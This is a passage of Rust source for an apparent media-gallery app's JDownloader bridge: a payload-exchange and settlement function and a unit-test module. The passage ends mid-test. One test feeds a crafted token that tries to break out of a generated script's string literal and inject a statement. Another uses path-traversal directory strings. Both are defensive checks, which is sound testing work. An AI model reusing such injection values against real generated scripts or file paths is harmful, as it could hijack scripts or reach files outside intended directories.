/// Process an incoming bridge exchange payload from the local JDownloader instance.
///
/// The order matters and is the contract:
///   1. a request whose sequence number was already answered is answered again
///      from the stored response, so a lost reply cannot lose a command;
///   2. every side effect and every bookkeeping write lands before the response
///      is returned;
///   3. a task is settled only from a complete snapshot whose identity set,
///      frozen manifest version and on-disk outputs all check out.
pub fn process_bridge_exchange(
    conn: &Connection,
    payload: &BridgeExchangePayload,
    roots: &MediaRoots,
) -> Result<BridgeExchangeResponse> {
    ensure_netdisk_bridge_schema(conn)?;

    if payload.bridge_id.trim().is_empty() {
        return Err(anyhow::Error::new(BridgeInvalid(
            "bridge_id is required".to_string(),
        )));
    }
    if payload.session_id.trim().is_empty() {
        return Err(anyhow::Error::new(BridgeInvalid(
            "session_id is required".to_string(),
        )));
    }
    if payload.seq == 0 {
        return Err(anyhow::Error::new(BridgeInvalid(
            "seq starts at 1".to_string(),
        )));
    }

    let digest = request_digest(payload)?;
    if let Some((stored_digest, stored_response)) =
        load_bridge_response(conn, &payload.bridge_id, &payload.session_id, payload.seq)?
    {
        if stored_digest != digest {
            return Err(anyhow::Error::new(BridgeConflict(format!(
                "seq {} was already answered for a different request",
                payload.seq
            ))));
        }
        let mut response: BridgeExchangeResponse = serde_json::from_str(&stored_response)?;
        response.replayed = true;
        return Ok(response);
    }

    let trusted = {
        let tx = conn.unchecked_transaction()?;
        record_bridge_session(&tx, payload)?;
        if payload.capabilities.is_some() {
            adopt_bridge_tasks(&tx, &payload.bridge_id, &payload.session_id)?;
        }
        tx.commit()?;
        bridge_capabilities_trusted(conn, &payload.bridge_id)?
    };

    let mut settled_receipts = 0usize;
    let mut errors = 0usize;
    let mut rejected = 0usize;
    let mut settlements: Vec<(BridgeTask, Vec<String>)> = Vec::new();

    {
        let tx = conn.unchecked_transaction()?;

        for command_id in &payload.command_acks {
            settle_bridge_command(&tx, &payload.bridge_id, command_id, true, "")?;
        }
        for result in &payload.command_results {
            settle_bridge_command(
                &tx,
                &payload.bridge_id,
                &result.command_id,
                result.ok,
                &result.detail,
            )?;
        }

        for page in &payload.pages {
            if page.job_id.trim().is_empty() || page.snapshot_id.trim().is_empty() {
                rejected += 1;
                log_bridge_event(
                    &tx,
                    "warn",
                    "bridge_report_unidentified",
                    "本地桥回报了没有任务身份或快照身份的清单页",
                    "",
                );
                continue;
            }
            let Some(task) = load_bridge_task(&tx, page.job_id.trim())? else {
                // A report for a task Gallery never issued is refused, not
                // guessed at. This is the path a numeric UUID used to take.
                rejected += 1;
                log_bridge_event(
                    &tx,
                    "warn",
                    "bridge_report_unpaired",
                    &format!("本地桥回报了未登记的任务 {}", page.job_id.trim()),
                    &page.snapshot_id,
                );
                continue;
            };
            if task.bridge_id != payload.bridge_id {
                rejected += 1;
                log_bridge_event(
                    &tx,
                    "warn",
                    "bridge_report_foreign_bridge",
                    &format!("任务 {} 属于另一台下载器", task.task_id),
                    &payload.bridge_id,
                );
                continue;
            }
            if !page.expected.is_empty() {
                let frozen = freeze_task_expectations(&tx, &task, &page.expected)?;
                if !frozen {
                    rejected += 1;
                    log_bridge_event(
                        &tx,
                        "warn",
                        "bridge_report_manifest_changed",
                        &format!("任务 {} 的输出身份集合已变化，保持冻结集合", task.task_id),
                        &page.snapshot_id,
                    );
                    continue;
                }
            }
            let state = merge_snapshot_page(&tx, &payload.bridge_id, page)?;
            for record in &state.changed {
                if record.is_failed() {
                    errors += 1;
                    let detail = record
                        .error
                        .as_deref()
                        .filter(|value| !value.trim().is_empty())
                        .unwrap_or(record.status.as_str());
                    log_bridge_event(
                        &tx,
                        "warn",
                        "bridge_receipt_failed",
                        &format!("本地桥任务 {} 报告输出失败：{detail}", task.task_id),
                        &record.download_path,
                    );
                }
            }
            if !state.complete {
                continue;
            }
            let task = load_bridge_task(&tx, page.job_id.trim())?.unwrap_or(task);
            if !trusted {
                rejected += 1;
                log_bridge_event(
                    &tx,
                    "warn",
                    "bridge_capability_unverified",
                    &format!("本地桥脚本能力未通过握手校验，任务 {} 不结算", task.task_id),
                    &payload.bridge_id,
                );
                continue;
            }
            let verdict = evaluate_settlement(
                &tx,
                &payload.bridge_id,
                &payload.session_id,
                &task,
                page,
                &state,
                roots,
            )?;
            if verdict.settle {
                settlements.push((task, verdict.outputs));
            } else {
                rejected += 1;
                log_bridge_event(
                    &tx,
                    "warn",
                    "bridge_receipt_rejected",
                    &format!(
                        "本地桥任务 {} 的回执未结算：{}",
                        task.task_id, verdict.reason
                    ),
                    &page.snapshot_id,
                );
            }
        }

        let commands = dispatch_bridge_commands(&tx, &payload.bridge_id)?;
        tx.commit()?;

        for (task, outputs) in &settlements {
            let receipt = ExternalReceipt {
                post_id: task.post_id,
                manifest_version: task.manifest_version,
                task_id: task.task_id.clone(),
                result: "completed".to_string(),
                output_paths: outputs.clone(),
                note: String::new(),
                bridge_id: payload.bridge_id.clone(),
            };
            let bridge = ExternalBridge {
                bridge_id: payload.bridge_id.clone(),
            };
            match record_external_receipt(conn, &receipt, roots, Some(&bridge)) {
                Ok(ReceiptOutcome::Recorded) => {
                    settled_receipts += 1;
                    conn.execute(
                        "UPDATE netdisk_bridge_tasks
                         SET state = ?1, updated_at = strftime('%s','now')
                         WHERE task_id = ?2",
                        params![BRIDGE_COMMAND_CONFIRMED, task.task_id],
                    )?;
                }
                Ok(ReceiptOutcome::Duplicate) => {
                    conn.execute(
                        "UPDATE netdisk_bridge_tasks
                         SET state = ?1, updated_at = strftime('%s','now')
                         WHERE task_id = ?2",
                        params![BRIDGE_COMMAND_CONFIRMED, task.task_id],
                    )?;
                }
                Ok(ReceiptOutcome::Stale) => {
                    log_bridge_event(
                        conn,
                        "warn",
                        "bridge_receipt_stale",
                        &format!("本地桥任务 {} 的回执版本已过期，仅留作历史", task.task_id),
                        "",
                    );
                }
                Ok(ReceiptOutcome::Rejected(reason)) => {
                    errors += 1;
                    log_bridge_event(
                        conn,
                        "warn",
                        "bridge_receipt_rejected",
                        &format!("本地桥任务 {} 的回执被拒：{reason}", task.task_id),
                        "",
                    );
                }
                Ok(ReceiptOutcome::NotFound) => {
                    errors += 1;
                    log_bridge_event(
                        conn,
                        "warn",
                        "bridge_receipt_not_found",
                        &format!("本地桥任务 {} 的目标作品不存在", task.task_id),
                        "",
                    );
                }
                Err(error) => {
                    errors += 1;
                    log_bridge_event(
                        conn,
                        "error",
                        "bridge_receipt_error",
                        &format!("本地桥任务 {} 的回执处理失败：{error}", task.task_id),
                        "",
                    );
                }
            }
        }
        conn.execute(
            "UPDATE netdisk_bridge_snapshots SET settled = 1
             WHERE bridge_id = ?1 AND settled = 0 AND complete = 1
               AND task_id IN (SELECT task_id FROM netdisk_bridge_tasks WHERE state = ?2)",
            params![payload.bridge_id, BRIDGE_COMMAND_CONFIRMED],
        )?;

        let response = BridgeExchangeResponse {
            ok: errors == 0,
            ack: payload.seq,
            settled_receipts,
            errors,
            rejected,
            replayed: false,
            commands,
            tasks: start_directives(conn, &payload.bridge_id)?,
        };
        store_bridge_response(conn, payload, &digest, &response)?;
        Ok(response)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rusqlite::Connection;

    fn test_conn() -> Connection {
        let conn = Connection::open_in_memory().unwrap();
        conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS artists (id INTEGER PRIMARY KEY, name TEXT, path TEXT);
             CREATE TABLE IF NOT EXISTS items (id INTEGER PRIMARY KEY);
             CREATE TABLE IF NOT EXISTS app_settings (
                 key TEXT PRIMARY KEY,
                 value TEXT NOT NULL,
                 updated_at REAL NOT NULL DEFAULT (strftime('%s','now'))
             );",
        )
        .unwrap();
        crate::ingest_publish::ensure_ingest_publish_schema(&conn).unwrap();
        crate::pawchive::ensure_pawchive_schema(&conn).unwrap();
        ensure_netdisk_bridge_schema(&conn).unwrap();
        conn
    }

    struct Fixture {
        conn: Connection,
        media: tempfile::TempDir,
        roots: MediaRoots,
        post_id: i64,
        work_id: String,
        manifest_version: i64,
    }

    fn fixture(service: &str, creator: &str, remote_post_id: &str) -> Fixture {
        let conn = test_conn();
        let media = tempfile::tempdir().unwrap();
        let roots = MediaRoots::identical(
            vec![media.path().to_string_lossy().to_string()],
            vec!["Media".to_string()],
        );
        conn.execute(
            "INSERT INTO kemono_subscriptions (service, user_id, target_dir, created_at, updated_at, mode)
             VALUES (?1, ?2, '/pictures/jd', '2026-09-19T00:00:00Z', '2026-09-19T00:00:00Z', 'auto')",
            params![service, creator],
        )
        .unwrap();
        let sub = conn.last_insert_rowid();
        conn.execute(
            "INSERT INTO kemono_posts (subscription_id, post_id, status, created_at, updated_at, published_at, assessment_state)
             VALUES (?1, ?2, 'pending', '2026-09-19T00:00:00Z', '2026-09-19T00:00:00Z', '2026-09-19T12:00:00Z', 'pending')",
            params![sub, remote_post_id],
        )
        .unwrap();
        let post_id = conn.last_insert_rowid();
        conn.execute(
            "UPDATE kemono_posts SET external_links=?1 WHERE id=?2",
            params![r#"["https://provider.example/share/example"]"#, post_id],
        )
        .unwrap();
        crate::pawchive::record_work_observation(
            &conn,
            post_id,
            crate::pawchive::ManifestCompleteness::Complete,
        )
        .unwrap();
        let (work_id, manifest_version) =
            crate::pawchive_pairing_write::work_of_post(&conn, post_id)
                .unwrap()
                .unwrap();
        Fixture {
            conn,
            media,
            roots,
            post_id,
            work_id,
            manifest_version,
        }
    }

    #[test]
    fn task_links_cannot_borrow_another_posts_metadata() {
        let f = fixture("patreon", "creator", "june");
        let own = "https://provider.example/share/example".to_string();
        let other = "https://provider.example/share/july".to_string();
        for links in [vec![other.clone()], vec![own.clone(), other]] {
            assert!(create_bridge_task(&f.conn, "jd-local", "s", f.post_id, &links, None).is_err());
        }
        assert_eq!(
            f.conn
                .query_row("SELECT COUNT(*) FROM netdisk_bridge_tasks", [], |r| r
                    .get::<_, i64>(0))
                .unwrap(),
            0
        );
        assert_eq!(
            f.conn
                .query_row("SELECT COUNT(*) FROM netdisk_bridge_commands", [], |r| r
                    .get::<_, i64>(0))
                .unwrap(),
            0
        );
        let task = create_bridge_task(
            &f.conn,
            "jd-local",
            "s",
            f.post_id,
            &[format!(" {own} "), own.clone()],
            None,
        )
        .unwrap();
        assert_eq!(task.links, vec![own.clone()]);
        assert_eq!(task.work_id, f.work_id);

        // Empty links automatically use post's own external links
        let auto_task = create_bridge_task(&f.conn, "jd-local", "s2", f.post_id, &[], None).unwrap();
        assert_eq!(auto_task.links, vec![own]);
    }

    impl Fixture {
        fn payload(
            &self,
            session: &str,
            seq: u64,
            pages: Vec<BridgeSnapshotPage>,
        ) -> BridgeExchangePayload {
            BridgeExchangePayload {
                version: NETDISK_PROTOCOL_VERSION.to_string(),
                bridge_id: "jd-local".to_string(),
                session_id: session.to_string(),
                seq,
                ack: seq.saturating_sub(1),
                command_acks: Vec::new(),
                command_results: Vec::new(),
                capabilities: Some(BridgeCapabilities {
                    script_version: NETDISK_SCRIPT_VERSION.to_string(),
                    protocol_version: NETDISK_PROTOCOL_VERSION.to_string(),
                    supports_commands: true,
                    supports_pagination: true,
                    supports_download_path: true,
                    supports_snapshot: true,
                    max_page_size: 100,
                    // The fixture stands in for a JD whose global auto-start is
                    // off, which is what a move requires.
                    linkgrabber_auto_start_enabled: Some(false),
                }),
                pages,
            }
        }

        fn handshake(&self, session: &str) {
            let payload = self.payload(session, 1, Vec::new());
            process_bridge_exchange(&self.conn, &payload, &self.roots).unwrap();
        }

        fn task(&self, session: &str) -> BridgeTask {
            create_bridge_task(
                &self.conn,
                "jd-local",
                session,
                self.post_id,
                &["https://provider.example/share/example".to_string()],
                None,
            )
            .unwrap()
        }

        fn write_output(&self, name: &str, bytes: &[u8]) -> String {
            let path = self.media.path().join(name);
            std::fs::write(&path, bytes).unwrap();
            path.to_string_lossy().to_string()
        }
    }

    fn finished(link_id: &str, name: &str, path: &str) -> BridgeLinkStatus {
        BridgeLinkStatus {
            link_id: link_id.to_string(),
            name: name.to_string(),
            status: "FINISHED".to_string(),
            finished: true,
            download_path: path.to_string(),
            ..Default::default()
        }
    }

    fn page(
        task: &BridgeTask,
        records: Vec<BridgeLinkStatus>,
        complete: bool,
    ) -> BridgeSnapshotPage {
        BridgeSnapshotPage {
            job_id: task.task_id.clone(),
            manifest_version: task.manifest_version,
            snapshot_id: "snap-1".to_string(),
            page_index: 0,
            total_count: records.len() as u32,
            complete,
            expected: records.iter().map(|r| r.link_id.clone()).collect(),
            records,
        }
    }

    // The settings panel reads §6.2's wording, so the translation has to be
    // pinned where the facts live. The load-bearing case is the settled task:
    // a receipt accepted against the manifest is 下载完成, but calling it 已入库
    // while its resources are still unbound would be the exact substitution the
    // plan forbids.
    #[test]
    fn a_task_view_only_claims_the_state_the_facts_support() {
        let f = fixture("patreon", "creator", "post-1");
        f.handshake("sess-1");
        let task = f.task("sess-1");

        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state"].as_str().unwrap(), BRIDGE_TASK_REGISTERED);
        assert_eq!(view["state_label"].as_str().unwrap(), "待开始");
        assert_eq!(view["link_count"].as_i64().unwrap(), 1);

        queue_bridge_command(
            &f.conn,
            "jd-local",
            &task.task_id,
            "add_links",
            &serde_json::json!({}),
        )
        .unwrap();
        f.conn
            .execute(
                "UPDATE netdisk_bridge_tasks SET state=?1 WHERE task_id=?2",
                params![BRIDGE_TASK_SUBMITTED, task.task_id],
            )
            .unwrap();
        let task = load_bridge_task(&f.conn, &task.task_id).unwrap().unwrap();
        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state_label"].as_str().unwrap(), "待核对");
        f.conn.execute(
            "INSERT INTO netdisk_bridge_snapshots (bridge_id,task_id,snapshot_id,records,updated_at)
             VALUES (?1,?2,'test-progress',?3,strftime('%s','now'))",
            params![task.bridge_id,task.task_id,r#"[{"running":true}]"#],
        ).unwrap();
        assert_eq!(
            bridge_task_view(&f.conn, &task).unwrap()["state_label"],
            "下载中"
        );
        f.conn
            .execute(
                "UPDATE netdisk_bridge_snapshots SET updated_at=0 WHERE task_id=?1",
                [&task.task_id],
            )
            .unwrap();
        assert_eq!(
            bridge_task_view(&f.conn, &task).unwrap()["state_label"],
            "待核对"
        );

        // A delivered resource that is not yet bound to a library item.
        f.conn
            .execute(
                "INSERT INTO kemono_files
                     (post_id, source_identity, remote_path, file_name, file_type, status, created_at, updated_at)
                 VALUES (?1, 'a.png', '/remote/a.png', 'a.png', 'image', 'completed', 't', 't')",
                params![f.post_id],
            )
            .unwrap();
        f.conn
            .execute(
                "UPDATE netdisk_bridge_tasks SET state=?1, expected='[\"archive\"]' WHERE task_id=?2",
                params![BRIDGE_TASK_SETTLED, task.task_id],
            )
            .unwrap();
        let task = load_bridge_task(&f.conn, &task.task_id).unwrap().unwrap();
        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state_label"].as_str().unwrap(), "待入库");
        assert_eq!(view["linked"].as_i64().unwrap(), 0);
        assert_eq!(view["total"].as_i64().unwrap(), 1);

        f.conn
            .execute(
                "UPDATE kemono_files SET evidence_item_id = 1 WHERE post_id = ?1",
                params![f.post_id],
            )
            .unwrap();
        // An unrelated subscription image does not prove the JD archive arrived.
        assert_eq!(
            bridge_task_view(&f.conn, &task).unwrap()["state_label"],
            "待入库"
        );
        f.conn
            .execute("INSERT INTO items(id) VALUES(1)", [])
            .unwrap();
        f.conn.execute("INSERT INTO download_publish_jobs
            (engine,source_job_id,manifest_version,source_identity,expected_length,expected_blake3,target_path,stage,item_id)
            VALUES('netdisk',?1,?2,'archive',1,'digest','archive.rar','ingested',1)",
            params![task.task_id,task.manifest_version]).unwrap();
        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state_label"].as_str().unwrap(), "已入库");

        // A command the bridge never confirmed is 需处理 even though the task is
        // still nominally submitted: silently staying 下载中 would report a
        // progress the install cannot substantiate.
        let command_id: i64 = f
            .conn
            .query_row(
                "SELECT id FROM netdisk_bridge_commands WHERE job_id=?1 ORDER BY id DESC LIMIT 1",
                params![task.task_id],
                |row| row.get(0),
            )
            .unwrap();
        f.conn
            .execute(
                "UPDATE netdisk_bridge_commands SET status=?1, last_error=?2 WHERE id=?3",
                params![BRIDGE_COMMAND_UNCERTAIN, "下载器未确认该命令", command_id],
            )
            .unwrap();
        f.conn
            .execute(
                "UPDATE netdisk_bridge_tasks SET state=?1 WHERE task_id=?2",
                params![BRIDGE_TASK_SUBMITTED, task.task_id],
            )
            .unwrap();
        let task = load_bridge_task(&f.conn, &task.task_id).unwrap().unwrap();
        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state_label"].as_str().unwrap(), "需处理");
        assert_eq!(view["attention"].as_str().unwrap(), "下载器未确认该命令");

        // A state the protocol does not define, with no unconfirmed command to
        // justify 需处理, falls through to 待核对 rather than to whichever label
        // happens to look closest.
        f.conn
            .execute(
                "UPDATE netdisk_bridge_commands SET status=?1, last_error='' WHERE id=?2",
                params![BRIDGE_COMMAND_CONFIRMED, command_id],
            )
            .unwrap();
        f.conn
            .execute(
                "UPDATE netdisk_bridge_tasks SET state='weird' WHERE task_id=?1",
                params![task.task_id],
            )
            .unwrap();
        let task = load_bridge_task(&f.conn, &task.task_id).unwrap().unwrap();
        let view = bridge_task_view(&f.conn, &task).unwrap();
        assert_eq!(view["state_label"].as_str().unwrap(), "待核对");
    }

    #[test]
    fn netdisk_settings_default_and_round_trip() {
        let conn = test_conn();
        let s = load_netdisk_settings(&conn).unwrap();
        assert_eq!(s, NetdiskSettings::default());

        let new_settings = NetdiskSettings {
            enabled: true,
            auto_start: false,
            auto_import: false,
            cleanup_after_import: false,
            staging_dir: "/vol1/downloads/staging".to_string(),
            import_dir: "/vol1/media/artist".to_string(),
            check_interval_secs: 15,
            reserve_space_gib: 20,
            bridge_configured: false,
        };
        save_netdisk_settings(&conn, &new_settings).unwrap();

        let loaded = load_netdisk_settings(&conn).unwrap();
        assert_eq!(loaded.enabled, true);
        assert_eq!(loaded.cleanup_after_import, false);
        assert_eq!(loaded.staging_dir, "/vol1/downloads/staging");
        assert_eq!(loaded.check_interval_secs, 15);
        assert_eq!(loaded.reserve_space_gib, 20);
        assert_eq!(loaded.bridge_configured, false);
    }

    #[test]
    fn netdisk_custom_directory_rejects_relative_and_parent_traversal() {
        for raw in [
            "",
            "downloads",
            "../downloads",
            "/media/../outside",
            "/media/\nname",
        ] {
            assert!(
                validate_download_directory(raw, "暂存目录").is_err(),
                "{raw:?}"
            );
        }
        for raw in [
            "/media/.staging",
            " /media/custom folder/ ",
            "/media/中文目录",
        ] {
            assert!(
                validate_download_directory(raw, "暂存目录").is_ok(),
                "{raw:?}"
            );
        }
    }

    #[test]
    fn netdisk_staging_directory_resolution_and_creation() {
        let temp = tempfile::tempdir().unwrap();
        let roots = MediaRoots::identical(
            vec![temp.path().to_string_lossy().to_string()],
            vec!["Media".to_string()],
        );
        let resolved = resolve_netdisk_staging_directory(&roots).unwrap();
        assert_eq!(resolved, temp.path().join(".staging"));
        assert!(!resolved.exists());

        let ensured = ensure_netdisk_staging_directory(&roots).unwrap().unwrap();
        assert_eq!(ensured, resolved);
        assert!(ensured.is_dir());
    }

    #[test]
    fn bridge_token_generation_and_verification() {
        let conn = test_conn();
        assert!(!verify_bridge_token(&conn, "any_token").unwrap());

        let token = rotate_bridge_token(&conn).unwrap();
        assert_eq!(token.len(), 64, "token is 32-byte hex string");
        assert!(verify_bridge_token(&conn, &token).unwrap());
        assert!(!verify_bridge_token(&conn, "wrong_token").unwrap());

        let settings = load_netdisk_settings(&conn).unwrap();
        assert!(settings.bridge_configured);
    }

    #[test]
    fn pairing_script_reuse_and_hash_only_upgrade_preserve_credentials() {
        let conn = test_conn();
        let original = rotate_bridge_token(&conn).unwrap();
        assert_eq!(
            saved_bridge_token(&conn).unwrap().as_deref(),
            Some(original.as_str())
        );
        conn.execute(
            "DELETE FROM app_settings WHERE key = ?1",
            [KEY_NETDISK_BRIDGE_TOKEN],
        )
        .unwrap();
        assert_eq!(saved_bridge_token(&conn).unwrap(), None);
        assert!(remember_bridge_token(&conn, "wrong").is_err());
        assert_eq!(saved_bridge_token(&conn).unwrap(), None);
        remember_bridge_token(&conn, &original).unwrap();
        assert_eq!(
            saved_bridge_token(&conn).unwrap().as_deref(),
            Some(original.as_str())
        );
        let replacement = rotate_bridge_token(&conn).unwrap();
        assert_ne!(replacement, original);
        assert!(!verify_bridge_token(&conn, &original).unwrap());
        assert!(remember_bridge_token(&conn, &original).is_err());
        assert_eq!(
            saved_bridge_token(&conn).unwrap().as_deref(),
            Some(replacement.as_str())
        );
        let public = serde_json::to_string(&load_netdisk_settings(&conn).unwrap()).unwrap();
        assert!(!public.contains(&replacement));
    }

    #[test]
    fn event_scripter_script_generation() {
        let script = generate_event_scripter_script("abcdef123456", "http://127.0.0.1:8899");
        assert!(script.contains("var GALLERY_TOKEN = \"abcdef123456\";"));
        assert!(script.contains("http://127.0.0.1:8899/api/netdisk/bridge/exchange"));
        assert!(script.contains("callAPI"));
        assert!(script.contains("postPage"));
        // No placeholder may survive into the generated body.
        assert!(!script.contains("__GALLERY_BRIDGE_"));
    }

    #[test]
    fn bridge_connection_requires_its_own_fresh_authenticated_session() {
        let conn = test_conn();
        let caps = BridgeCapabilities {
            protocol_version: NETDISK_PROTOCOL_VERSION.into(),
            supports_commands: true,
            supports_pagination: true,
            supports_download_path: true,
            supports_snapshot: true,
            linkgrabber_auto_start_enabled: Some(false),
            ..Default::default()
        };
        let mut payload = BridgeExchangePayload {
            bridge_id: "another-bridge".into(),
            session_id: "another-session".into(),
            seq: 1,
            capabilities: Some(caps),
            ..Default::default()
        };
        record_bridge_session(&conn, &payload).unwrap();
        assert_eq!(latest_bridge_session(&conn, "jd-local").unwrap(), None);
        assert!(!bridge_move_is_isolated(&conn, "jd-local").unwrap());
        payload.bridge_id = "jd-local".into();
        payload.session_id = "local-session".into();
        record_bridge_session(&conn, &payload).unwrap();
        assert_eq!(
            latest_bridge_session(&conn, "jd-local").unwrap().as_deref(),
            Some("local-session")
        );
        assert!(bridge_move_is_isolated(&conn, "jd-local").unwrap());
        conn.execute("UPDATE netdisk_bridge_sessions SET updated_at = updated_at - 90 WHERE bridge_id = 'jd-local'", []).unwrap();
        assert_eq!(latest_bridge_session(&conn, "jd-local").unwrap(), None);
        assert!(!bridge_move_is_isolated(&conn, "jd-local").unwrap());
        record_bridge_session(&conn, &payload).unwrap();
        rotate_bridge_token(&conn).unwrap();
        assert_eq!(latest_bridge_session(&conn, "jd-local").unwrap(), None);
        assert!(!bridge_move_is_isolated(&conn, "jd-local").unwrap());
        record_bridge_session(&conn, &payload).unwrap();
        assert!(latest_bridge_session(&conn, "jd-local").unwrap().is_some());
    }

    #[test]
    fn event_scripter_script_escapes_a_hostile_token() {
        let hostile = "a\"; GALLERY_TOKEN = \"b\\\nnewline";
        let script = generate_event_scripter_script(hostile, "http://127.0.0.1:8899");
        // The literal is closed once and the payload is escaped, so the token
        // cannot start new statements.
        assert!(!script.contains("\nnewline"));
        assert!(script.contains("\\\""));
    }

    #[test]
    fn a_complete_snapshot_of_a_frozen_manifest_settles_once() {
        let f = fixture("fanbox", "artist_a", "post_jd_1");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");
        let b = f.write_output("b.zip", b"payload b");

        let payload = f.payload(
            "sess-1",
            2,
            vec![page(
                &task,
                vec![
                    finished("link-a", "a.zip", &a),
                    finished("link-b", "b.zip", &b),
                ],
                true,
            )],
        );
        let resp = process_bridge_exchange(&f.conn, &payload, &f.roots).unwrap();
        assert_eq!(resp.settled_receipts, 1, "one task is settled once");
        assert_eq!(resp.rejected, 0);

        let (work_id, _) = crate::pawchive_pairing_write::work_of_post(&f.conn, f.post_id)
            .unwrap()
            .unwrap();
        assert_eq!(work_id, f.work_id);
        let count: i64 = f
            .conn
            .query_row(
                "SELECT COUNT(*) FROM pawchive_acquisition_events WHERE work_id = ?1",
                params![work_id],
                |row| row.get(0),
            )
            .unwrap();
        assert!(count >= 1, "a settled delivery leaves acquisition history");

        // The same snapshot reported again is not a second delivery.
        let again = f.payload(
            "sess-1",
            3,
            vec![page(
                &task,
                vec![
                    finished("link-a", "a.zip", &a),
                    finished("link-b", "b.zip", &b),
                ],
                true,
            )],
        );
        let resp2 = process_bridge_exchange(&f.conn, &again, &f.roots).unwrap();
        assert_eq!(resp2.settled_receipts, 0);
    }

    #[test]
    fn a_partial_snapshot_never_settles() {
        let f = fixture("fanbox", "artist_partial", "post_jd_partial");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");
        let b = f.write_output("b.zip", b"payload b");

        // The frozen identity set names two outputs; only one of them finished,
        // so the bridge cannot yet claim the manifest is complete.
        let mut partial = page(&task, vec![finished("link-a", "a.zip", &a)], false);
        partial.expected = vec!["link-a".to_string(), "link-b".to_string()];
        partial.total_count = 2;
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![partial]), &f.roots)
                .unwrap();
        assert_eq!(resp.settled_receipts, 0, "half a manifest settles nothing");
        let stored: i64 = f
            .conn
            .query_row(
                "SELECT complete FROM netdisk_bridge_snapshots WHERE task_id = ?1",
                params![task.task_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(stored, 0, "the snapshot is kept, and kept incomplete");

        // A page that omits the second output entirely cannot settle either.
        let mut short = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        short.expected = Vec::new();
        short.total_count = 2;
        let resp = process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![short]), &f.roots)
            .unwrap();
        assert_eq!(resp.settled_receipts, 0);

        // Only the page that actually reports both outputs settles.
        let mut whole = page(
            &task,
            vec![
                finished("link-a", "a.zip", &a),
                finished("link-b", "b.zip", &b),
            ],
            true,
        );
        whole.total_count = 2;
        let resp = process_bridge_exchange(&f.conn, &f.payload("sess-1", 4, vec![whole]), &f.roots)
            .unwrap();
        assert_eq!(resp.settled_receipts, 1);
    }

    /// A snapshot whose identity set is fully reported and terminal, but which
    /// the script has not marked complete, must still not settle.
    ///
    /// This isolates the completeness gate. In `a_partial_snapshot_never_settles`
    /// the missing output is refused by the frozen-set comparison first, so that
    /// test would keep passing even if the completeness gate were removed —
    /// which is exactly what a counterfactual revert showed. Here every other
    /// gate is satisfied, so only `complete` can refuse the settlement.
    #[test]
    fn a_snapshot_that_is_not_marked_complete_never_settles() {
        let f = fixture("fanbox", "artist_notcomplete", "post_jd_notcomplete");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");

        // Everything the frozen set names is present, finished, inside the
        // roots, and of the right length and digest. The only thing wrong is
        // that the bridge has not said the snapshot is complete.
        let mut open = page(&task, vec![finished("link-a", "a.zip", &a)], false);
        let resp = process_bridge_exchange(
            &f.conn,
            &f.payload("sess-1", 2, vec![open.clone()]),
            &f.roots,
        )
        .unwrap();
        assert_eq!(
            resp.settled_receipts, 0,
            "an incomplete snapshot must not settle, whatever else it reports"
        );
        let stored: i64 = f
            .conn
            .query_row(
                "SELECT complete FROM netdisk_bridge_snapshots WHERE task_id = ?1",
                params![task.task_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(stored, 0, "the snapshot is kept, and kept incomplete");

        // The same page, marked complete, settles: the difference is the flag,
        // not the records.
        open.complete = true;
        let resp = process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![open]), &f.roots)
            .unwrap();
        assert_eq!(resp.settled_receipts, 1);
    }

    /// The identity set is frozen by the first report that carries one, so a
    /// later report naming a different set is refused before settlement is
    /// considered. `a_changed_identity_set_is_refused` covers that path; this
    /// pins the other half of the contract, that the frozen set is what a
    /// settlement is measured against.
    #[test]
    fn the_first_reported_identity_set_is_the_one_that_is_frozen() {
        let f = fixture("fanbox", "artist_freeze", "post_jd_freeze");
        f.handshake("sess-1");
        let task = f.task("sess-1");
        let a = f.write_output("a.zip", b"payload a");
        let b = f.write_output("b.zip", b"payload b");

        // The first report freezes two outputs, but only one has finished.
        let mut first = page(&task, vec![finished("link-a", "a.zip", &a)], false);
        first.expected = vec!["link-a".to_string(), "link-b".to_string()];
        first.total_count = 2;
        process_bridge_exchange(&f.conn, &f.payload("sess-1", 2, vec![first]), &f.roots).unwrap();

        let frozen: String = f
            .conn
            .query_row(
                "SELECT expected FROM netdisk_bridge_tasks WHERE task_id = ?1",
                params![task.task_id],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(frozen, r#"["link-a","link-b"]"#);

        // A later report that drops the second output is refused rather than
        // silently re-scoping the task to what it happens to have finished.
        let mut narrowed = page(&task, vec![finished("link-a", "a.zip", &a)], true);
        narrowed.expected = vec!["link-a".to_string()];
        let resp =
            process_bridge_exchange(&f.conn, &f.payload("sess-1", 3, vec![narrowed]), &f.roots)
                .unwrap();
        assert_eq!(resp.settled_receipts, 0, "the task cannot be narrowed");
        assert_eq!(resp.rejected, 1);

        // Reporting both, with both finished, settles against the frozen set.
        let mut whole = page(
            &task,
            vec![
                finished("link-a", "a.zip", &a),
                finished("link-b", "b.zip", &b),
            ],
            true,
        );
        whole.total_count = 2;
        let resp = process_bridge_exchange(&f.conn, &f.payload("sess-1", 4, vec![whole]), &f.roots)
            .unwrap();
        assert_eq!(resp.settled_receipts, 1);
    }

    #[test]
    fn a_report_for_an_unregistered_task_is_refused_not_guessed() {
        let f = fixture("fanbox", "artist_unpaired", "post_jd_unpaired");
        f.handshake("sess-1");
        // A numeric job id that happens to equal the local post row must not be
        // read as that post.
        let mut p = page(
            &BridgeTask {
                task_id: f.post_id.to_string(),
                ..BridgeTask {
                    task_id: String::new(),
                    bridge_id: "jd-local".to_string(),
                    session_id: "sess-1".to_string(),
